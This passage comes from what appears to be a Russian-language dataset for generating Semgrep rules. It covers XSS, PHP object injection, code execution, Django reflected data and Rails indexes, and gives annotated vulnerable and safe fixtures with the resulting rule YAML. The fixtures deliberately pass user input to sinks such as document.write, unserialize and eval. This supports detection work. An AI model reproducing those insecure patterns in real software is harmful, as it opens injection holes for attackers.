    "input": "Требования:\n- Язык: typescript\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: react-unsanitized-method.jsx\nfunction Test1({input}) {\n  // ruleid: react-unsanitized-method\n    this.ref.insertAdjacentHTML('afterend', input.foo);\n  }\n  \n  function Test2({input}) {\n  // ruleid: react-unsanitized-method\n    document.write(input.foo);\n  }\n  \n  function Test3 () {\n  // ok: react-unsanitized-method\n    document.writeln(input);\n  }\n  \n  function OkTest1 () {\n  // ok: react-unsanitized-method\n    this.ref.insertAdjacentHTML('afterend', '<div id=\"two\">two</div>');\n  }\n  \n  function OkTest2 () {\n  // ok: react-unsanitized-method\n    document.write(\"<h1>foobar</h1>\");\n  }\n  \n  function OkTest3 () {\n  // ok: react-unsanitized-method\n    document.writeln(\"<p>foobar</p>\");\n  }\n  \n\n// File: react-unsanitized-method.tsx\nfunction Test1({input}) {\n  // ruleid: react-unsanitized-method\n    this.ref.insertAdjacentHTML('afterend', input.foo);\n  }\n  \n  function Test2({input}) {\n  // ruleid: react-unsanitized-method\n    document.write(input.foo);\n  }\n  \n  function Test3 () {\n  // ok: react-unsanitized-method\n    document.writeln(input);\n  }\n  \n  function OkTest1 () {\n  // ok: react-unsanitized-method\n    this.ref.insertAdjacentHTML('afterend', '<div id=\"two\">two</div>');\n  }\n  \n  function OkTest2 () {\n  // ok: react-unsanitized-method\n    document.write(\"<h1>foobar</h1>\");\n  }\n  \n  function OkTest3 () {\n  // ok: react-unsanitized-method\n    document.writeln(\"<p>foobar</p>\");\n  }  # Ограничиваем длину\n\nОпасные паттерны:\n• this.ref.insertAdjacentHTML('afterend', input.foo);\n• document.write(input.foo);\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:react-unsanitized-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:react-unsanitized-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: react-unsanitized-method\n  message: >-\n    Detection of $HTML from non-constant definition. This\n    can inadvertently expose users to cross-site scripting (XSS) attacks if this\n    comes from user-provided input. If you have to use $HTML,\n    consider using a sanitization library such as DOMPurify to sanitize your HTML.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://developer.mozilla.org/en-US/docs/Web/API/Document/writeln\n    - https://developer.mozilla.org/en-US/docs/Web/API/Document/write\n    - https://developer.mozilla.org/en-US/docs/Web/API/Element/insertAdjacentHTML\n    category: security\n    confidence: MEDIUM\n    technology:\n    - react\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n  languages:\n  - typescript\n  - javascript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n    - patterns:\n        - pattern-either:\n            - pattern-inside: |\n                function ...({..., $X, ...}) { ... }\n            - pattern-inside: |\n                function ...(..., $X, ...) { ... }\n        - focus-metavariable: $X\n        - pattern-either:\n            - pattern: $X.$Y\n            - pattern: $X[...]\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          this.window.document. ... .$HTML('...',$SINK) \n      - pattern: |\n          window.document. ... .$HTML('...',$SINK) \n      - pattern: |\n          document.$HTML($SINK)  \n    - metavariable-regex:\n        metavariable: $HTML\n        regex: (writeln|write)\n    - focus-metavariable: $SINK\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          $PROP. ... .$HTML('...',$SINK) \n    - metavariable-regex:\n        metavariable: $HTML\n        regex: (insertAdjacentHTML)\n    - focus-metavariable: $SINK\n  pattern-sanitizers:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          import $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          $S = require(\"underscore.string\")\n          ...\n    - pattern-either:\n      - pattern: $S.escapeHTML(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from \"dompurify\"\n          ...\n      - pattern-inside: |\n          import { ..., $S,... } from \"dompurify\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"dompurify\"\n          ...\n      - pattern-inside: |\n          $S = require(\"dompurify\")\n          ...\n      - pattern-inside: |\n          import $S from \"isomorphic-dompurify\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"isomorphic-dompurify\"\n          ...\n      - pattern-inside: |\n          $S = require(\"isomorphic-dompurify\")\n          ...\n    - pattern-either:\n      - patterns:\n        - pattern-inside: |\n            $VALUE = $S(...)\n            ...\n        - pattern: $VALUE.sanitize(...)\n      - patterns:\n        - pattern-inside: |\n            $VALUE = $S.sanitize\n            ...\n        - pattern: $S(...)\n      - pattern: $S.sanitize(...)\n      - pattern: $S(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from 'xss';\n          ...\n      - pattern-inside: |\n          import * as $S from 'xss';\n          ...\n      - pattern-inside: |\n          $S = require(\"xss\")\n          ...\n    - pattern: $S(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from 'sanitize-html';\n          ...\n      - pattern-inside: |\n          import * as $S from \"sanitize-html\";\n          ...\n      - pattern-inside: |\n          $S = require(\"sanitize-html\")\n          ...\n    - pattern: $S(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          $S = new Remarkable()\n          ...\n    - pattern: $S.render(...)\n\n\n# Логика правила:\nОбъяснение не сгенерировано\n\n# Ключевые элементы:\n- ID: react-unsanitized-method\n- Язык: typescript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "react-unsanitized-method",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения ruby-rails-performance-indexes-are-beneficial\nОписание уязвимости: The $COLUMN column appears to be a foreign key. Would it benefit from an index? Having an index can improve performance.\nCWE: \nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: ruby-rails-performance-indexes-are-really-beneficial.rb\nclass CreateProducts < ActiveRecord::Migration[7.0]\n  def change\n    # ok: ruby-rails-performance-indexes-are-beneficial\n    add_column :users, :email_id, :integer\n    add_index :users, :email_id\n\n    # ok: ruby-rails-performance-indexes-are-beneficial\n    add_column :users2, :email2_id, :integer, foo: :bar\n    add_index :users2, :email2_id, name: \"asdf\"\n\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users3, :email3_id, :integer, foo: bar\n    add_index :users3, [:email2_id, :other_id], name: \"asdf\"\n\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users4, :email4_id, :integer, { other_stuff: :asdf }\n\n    # ruleid: ruby-rails-performance-indexes-are-beneficial\n    add_column :users4, :email4_id, :bigint, { other_stuff: :asdf }\n  end\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• add_column :users4, :email4_id, :bigint, { other_stuff: :asdf }\n• add_column :users4, :email4_id, :integer, { other_stuff: :asdf }\n• add_column :users3, :email3_id, :integer, foo: bar\nadd_index :users3, [:email2_id, :other_id], name: \"asdf\"\n\nБезопасные паттерны:  \n• add_column :users, :email_id, :integer\nadd_index :users, :email_id\n• add_column :users2, :email2_id, :integer, foo: :bar\nadd_index :users2, :email2_id, name: \"asdf\"\n\nЛегенда аннотаций:\n- // ruleid:ruby-rails-performance-indexes-are-beneficial: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ruby-rails-performance-indexes-are-beneficial: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ruby-rails-performance-indexes-are-beneficial\n  patterns:\n  - pattern-not-inside: |\n      add_column $TABLE, $COLUMN, $TYPE, ...\n      ...\n      add_index $TABLE, $COLUMN, ...\n  - pattern: |\n      add_column $TABLE, $COLUMN, $TYPE, ...\n  - metavariable-regex:\n      metavariable: $COLUMN\n      regex: (.*_id$)\n  - metavariable-regex:\n      metavariable: $TYPE\n      regex: :integer|:bigint\n  message: >-\n    The $COLUMN column appears to be a foreign key. Would it benefit from\n    an index? Having an index can improve performance.\n  languages:\n  - ruby\n  severity: INFO\n  metadata:\n    category: performance\n    technology:\n    - rails\n    references:\n    - https://archive.is/i7SLO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных улучшений производительности в Ruby on Rails приложениях путем выявления столбцов, которые могут выиграть от наличия индексов. Анализ выполняется через поиск конструкций 'add_column' и 'add_index', где тип столбца является либо :integer, либо :bigint, а имя столбца заканчивается на '_id'. Это указывает на потенциальную связь столбца с внешним ключом, который может быть улучшен за счет индекса.\n\n# Ключевые элементы:\n- ID: ruby-rails-performance-indexes-are-beneficial\n- Язык: ruby \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "ruby-rails-performance-indexes-are-beneficial",
      "language": "ruby",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения wp-php-object-injection-audit\nОписание уязвимости: If the data used inside the patterns are directly used without proper sanitization, then this could lead to PHP Object Injection. Do not use these function with user-supplied input, use JSON functions instead.\nCWE: CWE-502: Deserialization of Untrusted Data\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-502: Deserialization of Untrusted Data\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-php-object-injection-audit.php\n<?php\n\n// ruleid: wp-php-object-injection-audit\n$content = unserialize($POST['post_content']);\n\n// ruleid: wp-php-object-injection-audit\n$rank_math=unserialize($rank_value);\n\n// ruleid: wp-php-object-injection-audit\n$import_options = maybe_unserialize($import->options);\n\n// ruleid: wp-php-object-injection-audit\n$data = unserialize(base64_decode($var));\n\n// ok: wp-php-object-injection-audit\n$data = serialize(base64_encode($var))\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• $content = unserialize($POST['post_content']);\n• $rank_math=unserialize($rank_value);\n• $import_options = maybe_unserialize($import->options);\n\nБезопасные паттерны:  \n• $data = serialize(base64_encode($var))\n\nЛегенда аннотаций:\n- // ruleid:wp-php-object-injection-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-php-object-injection-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-php-object-injection-audit\n    patterns:\n      - pattern-either:\n          - pattern: unserialize(...)\n          - pattern: maybe_unserialize(...)\n    message: >-\n      If the data used inside the patterns are directly used without proper\n      sanitization, then this could lead to PHP Object Injection. Do not use\n      these function with user-supplied input, use JSON functions instead.\n    paths:\n      include:\n        - '**/wp-content/plugins/**/*.php'\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: HIGH\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#php-object-injection\n        - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection\n      cwe:\n        - \"CWE-502: Deserialization of Untrusted Data\"\n      owasp:\n        - A03:2021 - Injection\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций unserialize() и maybe_unserialize(), которые могут привести к инъекции PHP объектов при обработке пользовательских данных без надлежащей санитизации. Анализируется наличие этих функций непосредственно после переменных или выражений, переданных пользователем. Правило применимо только к файлам PHP внутри папки wp-content/plugins/ и имеет низкий уровень уверенности и вероятности, но высокий уровень воздействия.\n\n# Ключевые элементы:\n- ID: wp-php-object-injection-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-php-object-injection-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения reflected-data-httpresponse\nОписание уязвимости: Found user-controlled request data passed into HttpResponse. This could be vulnerable to XSS, leading to attackers gaining access to user cookies and protected information. Ensure that the request data is properly escaped or sanitzed.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: reflected-data-httpresponse.py\nimport urllib\nfrom django.db.models import Q\nfrom django.auth import User\nfrom django.http import HttpResponse, HttpResponseBadRequest\nfrom django.utils.translation import ugettext as _\n\nfrom org import engines, manageNoEngine, genericApiException\n\ndef search_certificates(request):\n    # ruleid: reflected-data-httpresponse\n    user_filter = request.GET.get(\"user\", \"\")\n    if not user_filter:\n        msg = _(\"user is not given.\")\n        return HttpResponseBadRequest(msg)\n\n\n    user = User.objects.get(Q(email=user_filter) | Q(username=user_filter))\n    if user.DoesNotExist:\n        return HttpResponse(_(\"user '{user}' does not exist\").format(user_filter))\n\ndef previewNode(request, uid):\n    \"\"\"Preview evaluante node\"\"\"\n    try:\n        if uid in engines:\n            # ok: reflected-data-httpresponse\n            _nodeId = request.data.get('nodeId')\n            engines[uid].stoppable = True\n            _res = engines[uid].model.previewNode(_nodeId)\n            if _res is None:\n                return HttpResponse('', status=204)\n            return HttpResponse(_res)\n        return manageNoEngine()\n    except Exception as e:\n        return genericApiException(e, engines[uid])\n    finally:\n        engines[uid].stoppable = False\n\ndef inline_test(request):\n    # ruleid: reflected-data-httpresponse\n    return HttpResponse(\"Received {}\".format(request.POST.get('message')))  # Ограничиваем длину\n\nОпасные паттерны:\n• user_filter = request.GET.get(\"user\", \"\")\n• return HttpResponse(\"Received {}\".format(request.POST.get('message')))\n• data = request.W.get(...)\n\nБезопасные паттерны:  \n• user_filter = urllib.parse.quote_plus(request.GET.get(\"user\", \"\"))\n• return HttpResponse(\"Received {}\" .format(safe_escaped_message))\n• data = urllib.parse.unquote_plus(request.GET.get(...)\n\nЛегенда аннотаций:\n- // ruleid:reflected-data-httpresponse: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:reflected-data-httpresponse: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: reflected-data-httpresponse\n  message: Found user-controlled request data passed into HttpResponse. This could be vulnerable to XSS,\n    leading to attackers gaining access to user cookies and protected information. Ensure that the request\n    data is properly escaped or sanitzed.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://django-book.readthedocs.io/en/latest/chapter20.html#cross-site-scripting-xss\n    category: security\n    technology:\n    - django\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  patterns:\n  - pattern-inside: |\n      def $FUNC(...):\n        ...\n  - pattern-either:\n    - pattern: django.http.HttpResponse(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: django.http.HttpResponse(..., $S % request.$W.get(...), ...)\n    - pattern: django.http.HttpResponse(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: django.http.HttpResponse(..., request.$W.get(...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.http.HttpResponse(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.http.HttpResponse(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.http.HttpResponse(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.http.HttpResponse(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        django.http.HttpResponse(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: $A = django.http.HttpResponse(..., request.$W.get(...), ...)\n    - pattern: return django.http.HttpResponse(..., request.$W.get(...), ...)\n    - pattern: django.http.HttpResponse(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: django.http.HttpResponse(..., $S % request.$W(...), ...)\n    - pattern: django.http.HttpResponse(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: django.http.HttpResponse(..., request.$W(...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.http.HttpResponse(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.http.HttpResponse(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.http.HttpResponse(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.http.HttpResponse(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        django.http.HttpResponse(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: $A = django.http.HttpResponse(..., request.$W(...), ...)\n    - pattern: return django.http.HttpResponse(..., request.$W(...), ...)\n    - pattern: django.http.HttpResponse(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: django.http.HttpResponse(..., $S % request.$W[...], ...)\n    - pattern: django.http.HttpResponse(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: django.http.HttpResponse(..., request.$W[...], ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.http.HttpResponse(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.http.HttpResponse(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.http.HttpResponse(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.http.HttpResponse(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        django.http.HttpResponse(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: $A = django.http.HttpResponse(..., request.$W[...], ...)\n    - pattern: return django.http.HttpResponse(..., request.$W[...], ...)\n    - pattern: django.http.HttpResponse(..., $S.format(..., request.$W, ...), ...)\n    - pattern: django.http.HttpResponse(..., $S % request.$W, ...)\n    - pattern: django.http.HttpResponse(..., f\"...{request.$W}...\", ...)\n    - pattern: django.http.HttpResponse(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.http.HttpResponse(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.http.HttpResponse(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.http.HttpResponse(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.http.HttpResponse(..., f\"...{$DATA}...\", ...)\n    - pattern: $A = django.http.HttpResponse(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        $A = django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: return django.http.HttpResponse(..., request.$W, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        django.http.HttpResponse(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        django.http.HttpResponse(..., $INTERM, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пользовательского управляемого запроса в объекте HttpResponse в Django. Паттерны соответствуют различным способам создания объекта HttpResponse, где аргумент представляет данные из запроса пользователя, такие как GET или POST параметры. Правило ищет случаи, когда эти данные передаются напрямую в объект HttpResponse без предварительной обработки или экранирования, что может привести к уязвимостям XSS.\n\n# Ключевые элементы:\n- ID: reflected-data-httpresponse\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "reflected-data-httpresponse",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения wp-code-execution-audit\nОписание уязвимости: These functions can lead to code injection if the data inside them is user-controlled. Don't use the input directly or validate the data properly before passing it to these functions.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-code-execution-audit.php\n<?php\n\n// ruleid: wp-code-execution-audit\n$snippetValue = eval('return ' .$sanitizedSnippet . ';');\n\n// ruleid: wp-code-execution-audit\n$val = call_user_func($filter, $val);\n\n// ok: wp-code-execution-audit\nsome_other_safe_function($args);\n\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: wp-code-execution-audit.php\n\ncode:\neval('return ' .$sanitizedSnippet . ';');\n• // File: wp-code-execution-audit.php\n\ncode:\ncall_user_func($filter, $val);\n\nБезопасные паттерны:  \n• // File: wp-code-execution-audit.php\n\ncode:\nsome_other_safe_function($args);\n\nЛегенда аннотаций:\n- // ruleid:wp-code-execution-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-code-execution-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-code-execution-audit\n    patterns:\n      - pattern-either:\n          - pattern: eval(...)\n          - pattern: assert(...)\n          - pattern: call_user_func(...)\n    message: >-\n      These functions can lead to code injection if the data inside them is\n      user-controlled. Don't use the input directly or validate the data\n      properly before passing it to these functions.\n    paths:\n      include:\n        - '**/wp-content/plugins/**/*.php'\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: HIGH\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#php-code-execution\n      owasp: \n        - \"A03:2021 - Injection\"\n      cwe: \n        - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей wp-code-execution-аудита путем выявления использования функций eval(), assert() и call_user_func(). Эти функции могут привести к инъекциям кода, если данные внутри них контролируются пользователем. Правило применяет шаблон pattern-either для поиска любого из указанных шаблонов и выводит предупреждение при их обнаружении.\n\n# Ключевые элементы:\n- ID: wp-code-execution-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-code-execution-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: flask-api-method-string-format\nОписание уязвимости: Method $METHOD in API controller $CLASS provides user arg $ARG to requests method $REQMETHOD\nCWE: CWE-134: Use of Externally-Controlled Format String\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-134: Use of Externally-Controlled Format String\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: flask-api-method-string-format.py\nimport requests\n\nclass FOO(resource):\n    method_decorators = decorator()\n    # ok:flask-api-method-string-format\n    def get(self, somearg):\n        createRecord(somearg)\n\n    # ruleid:flask-api-method-string-format\n    def get(self, arg1):\n        print(\"foo\")\n        string = \"foo\".format(arg1)\n        foo = requests.get(string)\n\n    # ok:flask-api-method-string-format\n    def get(self, somearg):\n        otherFunc(\"hello world\")\n\n    # ruleid:flask-api-method-string-format\n    def get2(self,arg2):\n        someFn()\n        bar = requests.get(\"foo\".format(arg2))  # Ограничиваем длину\n\nОпасные паттерны:\n• def get(self, arg1):\n    print(\"foo\")\n    string = \"foo\".format(arg1)\n    foo = requests.get(string)\n• def get2(self,arg2):\n    someFn()\n    bar = requests.get(\"foo\".format(arg2))\n\nБезопасные паттерны:  \n• def get(self, somearg):\n    createRecord(somearg)\n• def get(self, somearg):\n    otherFunc(\"hello world\")\n\nЛегенда аннотаций:\n- // ruleid:flask-api-method-string-format: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:flask-api-method-string-format: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: flask-api-method-string-format\n  patterns:\n  - pattern-either:\n    - pattern: |\n        def $METHOD(...,$ARG,...):\n          ...\n          $STRING = \"...\".format(...,$ARG,...)\n          ...\n          ... = requests.$REQMETHOD($STRING,...)\n    - pattern: |\n        def $METHOD(...,$ARG,...):\n          ...\n          ... = requests.$REQMETHOD(\"...\".format(...,$ARG,...),...)\n  - pattern-inside: |\n      class $CLASS(...):\n        method_decorators = ...\n        ...\n  message: >-\n    Method $METHOD in API controller $CLASS provides user arg $ARG to requests method $REQMETHOD\n  severity: ERROR\n  languages:\n  - python\n  metadata:\n    cwe:\n    - 'CWE-134: Use of Externally-Controlled Format String'\n    category: security\n    technology:\n    - flask\n    references:\n    - https://cwe.mitre.org/data/definitions/134.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования форматированных строк в методах Flask API-контроллера, которые передаются в аргументы метода requests. Анализ выполняется путем поиска определения методов класса Flask, где аргумент форматируется в строку и затем используется в вызове метода requests. Правило использует шаблон или (pattern-either) для охвата обоих возможных способов создания форматированной строки и проверяет наличие декоратора метода_decorators, указывающего на контроллер API.\n\n# Ключевые элементы:\n- ID: flask-api-method-string-format\n- Язык: python \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "flask-api-method-string-format",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-lambda-environment-credentials\nОписание уязвимости: A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
